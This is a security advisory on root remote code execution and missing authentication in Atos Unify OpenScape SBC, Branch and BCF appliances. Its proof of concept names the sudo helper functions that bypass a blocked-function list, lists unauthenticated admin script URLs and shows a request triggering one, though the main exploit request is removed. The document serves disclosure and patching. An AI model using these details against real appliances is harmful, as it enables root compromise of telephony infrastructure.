@@ -1,0 +1,373 @@
+id: 39069
+date: 09/18/2023
+title: Atos Unify OpenScape Code Execution / Missing Authentication Vulnerabilities
+author: Armin Weihbold
+cves: CVE-2023-36618, CVE-2023-36619
+
+=======================================================================
+               title: Authenticated Remote Code Execution and
+                      Missing Authentication
+             product: Atos Unify OpenScape Session Border Controller
+                      Atos Unify OpenScape Branch
+                      Atos Unify OpenScape BCF
+  vulnerable version: OpenScape SBC before V10 R3.3.0
+                      OpenScape Branch V10 before V10 R3.3.0
+                      OpenScape BCF V10 before V10 R10.10.0
+       fixed version: OpenScape SBC V10 >=R3.3.0
+                      OpenScape Branch V10 >=R3.3.0
+                      OpenScape BCF V10 >=R10.10.0
+          CVE number: CVE-2023-36618, CVE-2023-36619
+              impact: critical
+            homepage: https://unify.com
+               found: 2023-04-21
+                  by: Armin Weihbold (Office Linz)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Eviden business
+                      Europe | Asia
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Unify is is the Atos brand for communication and collaboration solutions
+Unify is the newest member of the Atos family, combining Atos’ knowledge and
+reputation in the IT services market with Unify’s expertise in unified
+communications and collaboration to provide customers with seamless services
+solutions for their entire digital portfolio. Within Atos, Unify continues to
+deliver a unique integrated proposition for unified communications and real
+time capabilities."
+
+Source: https://unify.com/en/expert/unify
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends users of the affected products to install the latest
+update.
+
+Furthermore, an in-depth security analysis performed by security professionals
+is highly advised, as the software may be affected from other security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Authenticated Remote Code Execution (CVE-2023-36618)
+The API of the administrative web application insufficiently validates the
+input of authenticated users at the server. This leads to the possibility of
+executing arbitrary PHP functions (with some defined exceptions) and
+subsequently operating system level commands with root privileges.
+A low-privileged ReadOnly role is sufficient to exploit this security issue.
+
+2) Missing Authentication (CVE-2023-36619)
+A number of scripts that are used to administer the appliance can be
+accessed or executed unauthenticated via the web server.
+
+
+Proof of concept:
+-----------------
+1) Authenticated Remote Code Execution (CVE-2023-36618)
+A large part of the application is built according to the scheme in the
+following listing. Some functions are defined and at the end the function
+`callMainFunction` is called, which takes care of processing POST data.
+
+-----------------------------------------------------------------------
+  <?php
+     require_once '../core/CoreAPI.php';
+
+     function tempSessionAcdQueue($args = null)
+     {
+         [...SNIP...]
+     }
+
+     function getAcdQueueInfo($args = null) {
+         [...SNIP...]
+     }
+
+     // calls function which will handle the Post requests
+     callMainFunction();
+-----------------------------------------------------------------------
+
+`callMainFunction` in `/srv/www/htdocs/core/CoreAPI.php` essentially
+calls arbitrary functions with arbitrary arguments passed via POST parameters,
+and only tests beforehand whether or not they are in a list of forbidden
+functions (`cfgUtilCheckMethod`) and whether the user is authenticated:
+
+-----------------------------------------------------------------------
+     <?php
+[...]
+     require_once 'cfgUtil.php';
+[...]
+
+
+     function callMainFunction () {
+
+         $func = ( isset($_POST['method']) ) ? trim(cfgUtilGetPostData('method')) : null ;
+         if (cfgUtilCheckMethod($func)) return;
+         $args = ( isset($_POST['args']) ) ? cfgUtilSanitizePostArgs(json_decode($_POST['args'], true)) : null ;
+[...]
+
+         if ( function_exists($func) && is_callable($func) ) {
+             @session_start();
+             if (!isset($_SESSION["Authenticated"]) || ($_SESSION["Authenticated"] == false)) {
+                 session_destroy();
+[...]
+             } else {
+                 if ( $args != null ) $func($args);
+                 else $func();
+             }
+         }
+     }
+-----------------------------------------------------------------------
+
+Then `cfgUtilCheckMethod` in `/srv/www/htdocs/core/cfgUtil.php` checks for a number
+of dangerous functions which should get blocked:
+
+-----------------------------------------------------------------------
+function cfgUtilCheckMethod($func)
+{
+     if (isset($func)) {
+         // block methods
+         $methods = array(
+[...]
+             “eval”,
+             “exec”,
+[...]
+             “shell_exec”,
+[...]
+             “system”,
+         );
+         if (in_array($func, $methods)) return 1;
+     }
+     return 0;
+}
+-----------------------------------------------------------------------
+
+What has been forgotten here are the functions provided by cfgUtil.php itself
+like `cfgUtilExecute`, `cfgUtilShellExec` and especially
+`cfgUtilShellExecSudo`, `cfgUtilSetPermExecSudo` and `cfgUtilExecSudo`.
+
+These functions allow an authenticated attacker (a ReadOnly role is sufficient
+for this) to execute arbitrary commands as root user on the appliance.
+
+-----------------------------------------------------------------------
+function cfgUtilShellExecSudo( $command, $escape = TRUE, $supressLog = FALSE )
+{
+     $newcommand=$command;
+     if ( $escape == TRUE ) $newcommand = escapeshellcmd($command);
+     if ( ($newcommand != $command) and ($supressLog != TRUE ) )
+         osb_log(E_WARNING, debug_backtrace()[1][‘function’]. “(): The command: “ . $command . “ is not equivalent to: “ . $newcommand);
+     $retvalue = trim(shell_exec(‘/usr/bin/sudo ‘ . $newcommand ));
+     return $retvalue;
+}
+-----------------------------------------------------------------------
+
+To demonstrate the RCE vulnerability, it is sufficient to send a request like
+the following to any endpoint that calls `callMainFunction` like in:
+[PoC URL removed]
+-----------------------------------------------------------------------
+[PoC POST request removed]
+-----------------------------------------------------------------------
+
+
+The server response indicates a successful request:
+-----------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Fri, 21 Apr 2023 10:22:42 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Expires: 0
+Cache-Control: max-age=0, must-revalidate
+Pragma: no-cache
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+-----------------------------------------------------------------------
+
+If we now list the contents of the `/tmp` directory on the server, we see
+that the file `root_from_ro` was created by the root user:
+
+
+-----------------------------------------------------------------------
+user@server:/tmp> ls -al
+[...]
+-rw-r--r--  1 root        root           0 Apr 21 10:22 root_from_ro
+-----------------------------------------------------------------------
+
+
+2) Missing Authentication (CVE-2023-36619)
+The following scripts, which are executable without authentication and
+do not expect command line arguments, could be identified. For this,
+heuristic methods based on the source code were used. In particular, scripts
+were searched that do not use any of the normally used authentication
+methods and do not only consist of classes.
+
+- https://hostname/core/configuringInBackground.php
+- https://hostname/core/downloadProfiles.php
+- https://hostname/core/hello_world.php
+- https://hostname/core/scripts/applyZooServerData.php
+- https://hostname/core/scripts/cfgGenUpdateSSPStatusTable.php
+- https://hostname/core/scripts/checkcardsDbHw.php
+- https://hostname/core/scripts/config1.php
+- https://hostname/core/scripts/recover.php
+- https://hostname/core/scripts/start.php
+- https://hostname/core/scripts/startPre.php
+- https://hostname/core/shutdown.php
+- https://hostname/data/sipLbInfo.php
+- https://hostname/data/turnInfo.php
+
+The following demonstrates an execution. The following request is sent
+to the appliance:
+
+
+-----------------------------------------------------------------------
+GET /core/scripts/start.php HTTP/1.1
+Host: hostname
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: https://hostname/acd.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+-----------------------------------------------------------------------
+
+In the successful response, the time is highlighted to compare with the PHP
+log:
+
+-----------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Thu, 20 Apr 2023 11:47:34 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+-----------------------------------------------------------------------
+
+In the PHP log you will now find the following output, which shows that
+this script is used for configuring and starting the appliance and was
+actually executed:
+
+-----------------------------------------------------------------------
+2023-04-20T11:47:34+00:00 [notice] PHP Notice:  --------------------------------------- in /srv/www/htdocs/core/scripts/start.php on line 33
+[...] ---------- Running start.php ---------- in /srv/www/htdocs/core/scripts/start.php on line 34
+[...] --------------------------------------- in /srv/www/htdocs/core/scripts/start.php on line 35
+[...] Loading XML in /srv/www/htdocs/core/scripts/start.php on line 61
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 599
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 600
+[...] ---------- Running start() OSS    ----------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 601
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 602
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 603
+[...] Starting start() OSS in /srv/www/htdocs/core/ConfigMgrOSS.php on line 607
+[...] Active partition: 4 /dev/sda6 in /srv/www/htdocs/core/ConfigMgrOSS.php on line 613
+[...] Calling hookStart start in /srv/www/htdocs/core/ConfigMgrOSS.php on line 622
+[...] Configuring Alarm in /srv/www/htdocs/core/ConfigMgrOSS.php on line 626
+[...] Configuring Node for Redundancy in /srv/www/htdocs/core/ConfigMgrOSS.php on line 630
+[...] Red. Selection cleared (standlone)... in /srv/www/htdocs/core/NetServicesData.php on line 162
+[...] Redundant Node 1 removed in /srv/www/htdocs/core/NetServicesData.php on line 163
+[...] Redundant Node 2 removed in /srv/www/htdocs/core/NetServicesData.php on line 164
+[...] Configuring Watchdog in /srv/www/htdocs/core/ConfigMgrOSS.php on line 640
+[...] Configuring irqBalance in /srv/www/htdocs/core/ConfigMgrOSS.php on line 644
+[...] Configuring OpenVmWare in /srv/www/htdocs/core/ConfigMgrOSS.php on line 648
+[...] Configuring RADIUS in /srv/www/htdocs/core/ConfigMgrOSS.php on line 662
+[...] Configuring SSH Public Keys in /srv/www/htdocs/core/ConfigMgrOSS.php on line 666
+[...] Configuring IP Aliases in /srv/www/htdocs/core/ConfigMgrOSS.php on line 671
+[...] Configuring Traffic Shaping in /srv/www/htdocs/core/ConfigMgrOSS.php on line 679
+[...] Configuring Zookeeper Client in /srv/www/htdocs/core/ConfigMgrOSS.php on line 688
+[...] Configuring RTP Proxy in /srv/www/htdocs/core/ConfigMgrOSS.php on line 693
+[...] Configuring SSM in /srv/www/htdocs/core/ConfigMgrOSS.php on line 697
+[...] Configuring SipServer in /srv/www/htdocs/core/ConfigMgrOSS.php on line 705
+[...] UA WhiteList:  in /srv/www/htdocs/core/cfgSipServerSP.php on line 2896
+[...] simplexml_load_file( /osb/var/mngmt/xml/running/config_20_20230223T115247.xml ) in /srv/www/htdocs/core/PersistenceMgr.php on line 520
+[...] Circuit feature enabled ? 0 in /srv/www/htdocs/core/AnsibleData.php on line 42
+[...] New xml cache file created daec97748bc1828d8514ee16e200a834 in /srv/www/htdocs/core/PersistenceMgr.php on line 1883
+[...] Locking SSP Register in /srv/www/htdocs/core/cfgSipServerOSS.php on line 2682
+[...] SipServer configuration changed. in /srv/www/htdocs/core/cfgSipServerSP.php on line 2595
+[...] Configuring Media Server in /srv/www/htdocs/core/ConfigMgrOSS.php on line 726
+[...] Configuring IPSec in /srv/www/htdocs/core/ConfigMgrOSS.php on line 734
+[...] Configuring VPN in /srv/www/htdocs/core/ConfigMgrOSS.php on line 741
+[...] Configuring Certificate Management in /srv/www/htdocs/core/ConfigMgrOSS.php on line 745
+[...] Configuring Web Secure Management in /srv/www/htdocs/core/ConfigMgrOSS.php on line 749
+[...] Configuring TURN Server in /srv/www/htdocs/core/ConfigMgrOSS.php on line 754
+[...] Configuring Sip Loadbalancer in /srv/www/htdocs/core/ConfigMgrOSS.php on line 759
+[...] Configuring GTC Loader in /srv/www/htdocs/core/ConfigMgrOSS.php on line 764
+[...] Configuring GTC Node app  in /srv/www/htdocs/core/ConfigMgrOSS.php on line 769
+[...] Configuring Serviceability in /srv/www/htdocs/core/ConfigMgrOSS.php on line 774
+[...] Configuring QoS Send Trap in /srv/www/htdocs/core/ConfigMgrOSS.php on line 779
+[...] Configuring Push Notification in /srv/www/htdocs/core/ConfigMgrOSS.php on line 784
+[...] Configuring Branding in /srv/www/htdocs/core/ConfigMgrOSS.php on line 797
+[...] Calling hookStart stop in /srv/www/htdocs/core/ConfigMgrOSS.php on line 800
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 838
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 839
+[...] ---------- Done start() OSS       ----------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 840
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 841
+[...] --------------------------------------------- in /srv/www/htdocs/core/ConfigMgrOSS.php on line 842
+[...] --------------------------------------- in /srv/www/htdocs/core/scripts/start.php on line 77
+[...] ---------- Done start.php (0) --------- in /srv/www/htdocs/core/scripts/start.php on line 78
+[...] --------------------------------------- in /srv/www/htdocs/core/scripts/start.php on line 79
+[...]
+-----------------------------------------------------------------------
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested which was the latest version available
+at the time of the test:
+* OpenScape Session Border Controller Firmware Version V10 R3.01.03
+
+According to vendor, versions before V10 R3.3.0 are affected as well.
+
+The vendor confirmed that the following other products are vulnerable as well:
+* OpenScape Branch version before V10 R3.3.0
+* OpenScape BCF version before V10 R10.10.0
+
+
+Vendor contact timeline:
+------------------------
+2023-06-12: Contacting vendor through email obso@atos.net; sending
+             encrypted advisory (S/MIME)
+2023-06-15: Call with vendor, discussing release and timeline.
+             Requesting CVE numbers through MITRE.
+2023-06-28: Vendor provides update regarding timeline / patch availability and
+             affected products.
+             Sending received CVE numbers to vendor.
+2023-06-29: Vendor provides draft of their security advisory including
+             planned release dates of patched versions. Giving feedback.
+             Receiving download URL from vendor.
+2023-07-04: Receiving updated version of vendor security advisory,
+             providing some more feedback/minor fixes.
+2023-07-06: Vendor releases security advisory and patches.
+2023-09-18: Coordinated release of advisory
+
+
+Solution:
+---------
+The vendor provides a patch for the affected products:
+* OpenScape Session Border Controller Firmware Version V10 >=R3.3.0
+* OpenScape Branch version V10 >=R3.3.0
+* OpenScape BCF version V10 >=R10.10.0
+
+The patches can be obtained for registered customers through the vendor's
+download server:
+https://sws.unify.com/SWSIntranet/SWSIntra.aspx or via
+https://unify.com/en/partner/partnerportal
+https://unify.com/en/support/kunden-support-portal
+
+Furthermore, the vendor has also released a security advisory which is
+available here:
+https://networks.unify.com/security/advisories/OBSO-2307-01.pdf
+
+
+Workaround:
+-----------
+Limit access to the administrative web application to authorized personnel
+on the network level.
+
+#  0day.today [2023-09-20]  #
